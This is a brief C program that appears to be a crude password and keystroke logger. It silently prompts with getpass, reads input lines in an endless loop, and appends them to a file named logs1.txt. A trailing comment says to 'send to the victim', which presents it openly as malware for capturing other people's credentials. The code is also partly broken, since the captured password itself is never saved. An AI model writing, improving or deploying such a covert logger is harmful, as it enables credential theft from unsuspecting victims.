#include <stdio.h>
#include <unistd.h>   

int main()

{
     
     FILE * pFile;

     char sentence [300];

     char *password; // password string pointer
  
     change:

     password = getpass(" "); // get a password
 
     fgets (sentence,256,stdin);
	
    // printf("\nStored: %s\n",password); // this is just for conformation
                             // that password stored successfully
     pFile = fopen ("logs1.txt","a+");
   
     fputs (sentence,pFile);
   
     fclose (pFile);

     goto change;
 
     return 0;
}
/// send to the victim if like some IDS.
